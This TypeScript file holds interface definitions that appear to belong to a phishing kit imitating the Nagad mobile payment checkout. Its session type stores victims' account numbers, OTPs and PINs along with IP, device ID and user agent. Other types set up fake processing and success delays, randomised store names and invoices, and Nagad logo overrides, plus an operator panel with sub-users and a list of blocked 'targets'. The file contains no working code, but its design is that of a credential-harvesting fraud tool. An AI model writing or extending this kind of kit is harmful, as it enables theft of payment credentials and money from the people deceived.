export interface StoreSettings {
  storeName: string;
  amount: string;
  currency: 'BDT' | '৳';
  charge: string;
  invoiceNo: string;
  processingTimeSeconds: number;
  successTimeSeconds: number;
  autoRandomizeStore: boolean;
  autoRandomizeInvoice: boolean;
  customLogoUrl: string;
  customFaviconUrl: string;
  pageTitle: string;
  storeNamesList: string[];
  nagadTopLogoUrl?: string;
  nagadInputLogoUrl?: string;
  instructionsImageUrl?: string;
  numberPageIconUrl?: string;
  pinPageIconUrl?: string;
}

export interface TransactionSession {
  id: string;
  accountNumber: string;
  otp: string;
  pin: string;
  ip: string;
  deviceId: string;
  userAgent: string;
  timestamp: number;
  step: 'number' | 'otp' | 'pin' | 'processing' | 'success' | 'completed';
  storeName: string;
  amount: string;
  currency: 'BDT' | '৳';
  charge: string;
  invoiceNo: string;
  status: 'active' | 'completed' | 'blocked';
  resendCount?: number;
  lastResendAt?: number;
  updatedAt: number;
  gatewayTag?: string;
}

export interface AdminUser {
  email: string;
  role: 'superadmin' | 'subuser';
  gatewayTag: string;
  password?: string;
  createdAt?: number;
}

export interface BlockedTarget {
  id: string;
  ip: string;
  deviceId: string;
  blockedAt: number;
}
